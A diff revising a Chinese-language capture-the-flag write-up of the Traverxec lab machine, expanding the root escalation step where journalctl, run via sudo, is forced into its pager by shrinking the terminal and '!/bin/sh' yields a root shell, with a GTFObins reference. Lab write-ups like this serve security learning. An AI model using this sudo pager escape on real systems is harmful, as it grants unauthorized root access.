@@ -485,7 +485,6 @@ journalctl 是一个收集服务日志的服务
 ```shell
 david@traverxec:~/bin$ cat server-stats.sh 
 #!/bin/bash
-
 cat /home/david/bin/server-stats.head
 echo "Load: `/usr/bin/uptime`"
 echo " "
@@ -496,9 +495,23 @@ echo "Last 5 journal log lines:"
 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
 ```
 
-发现  /usr/bin/journalctl 是作为 root 运行的。查看  [GTFO bin](https://gtfobins.github.io/gtfobins/journalctl/)，发现它只是按照脚本中给出的命令运行。
+发现  /usr/bin/journalctl 是作为 root 运行的，这一点很重要。
 
-执行最后一条命令，注意此时 terminal 的窗口必须尽可能的小才能执行命令（或者使用 `less` 命令），执行 `!/bin/sh`，获得 root 权限。
+查看  [GTFObins](https://gtfobins.github.io/gtfobins/journalctl/)，发现通过 sudo 运行的 journalctl 可以被利用来提权。
+
+> **GTFObins:** Gtfo这款工具采用Python3开发，在Gtfo的帮助下，广大研究人员可以直接在命令行终端窗口中搜索 GTFOBins(Linux) 和 LOLBAS(Win) 代码文件。
+>
+> 该工具的主要功能就是帮助研究人员直接在命令行终端窗口中搜索 GTFOBins 和 LOLBAS 代码文件。除此之外，它还可以让研究人员专注于命令行串钩，而无需面对明亮的白色背景的桌面窗口，它可以帮助我们将vim、反向Shell和其他漏洞利用“合为一体”。
+>
+> [如何在Windows和Linux上搜索可利用的二进制文件或exe文件](https://www.freebuf.com/sectool/214286.html)
+
+![image-20200103100856286](https://tva1.sinaimg.cn/large/006tNbRwgy1gaj5evah4wj31e00u07bg.jpg)
+
+注意到 `journalctl` 的提权利用方式和 `less` 一样，因此必须想办法触发 `pager` ，一个简单的办法就是把终端窗口尽可能调小。之后执行 `!/bin/sh`，获得 root 权限。
+
+<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);"     src="https://tva1.sinaimg.cn/large/006tNbRwgy1gaj5opf7nlj31c00u0b29.jpg">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">当窗口较大则无法触发</div> </center>
+
+<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);"     src="https://tva1.sinaimg.cn/large/006tNbRwgy1gaj60bu62rj31460u0qdv.jpg">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">当窗口较小则可以提权</div> </center>
 
 ```shell
 david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
@@ -518,6 +531,6 @@ root
 nostromo_1.9.6-1.deb  root.txt
 ```
 
-> Todo 讲道理这里还不太懂，需要再看看资料
-
 ## 0x05 Thanks！
+
+也算是自己边学边记录，望大佬手下留情~
